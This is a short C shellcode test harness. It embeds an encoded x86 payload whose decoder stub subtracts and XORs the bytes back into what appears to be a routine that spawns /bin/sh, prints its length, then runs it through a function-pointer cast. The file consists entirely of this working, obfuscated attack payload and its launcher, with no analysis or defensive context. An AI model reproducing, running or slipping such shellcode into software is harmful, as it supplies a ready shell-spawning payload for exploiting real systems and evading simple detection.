#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x14\x5e\x31\xc0\x31\xdb\x31\xc9\xb1\x19\x80\x2e\x03\x80\x36\xaa\x46\xe2\xf7\xeb\x05\xe8\xe7\xff\xff\xff\x9e\x6d\xfd\xc5\x88\x88\xdc\xc5\xc5\x88\xcb\xc6\xc7\x26\x4c\xfd\x26\x4b\xfc\x26\x4e\x1d\xa4\x6a\x2d"; 



main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
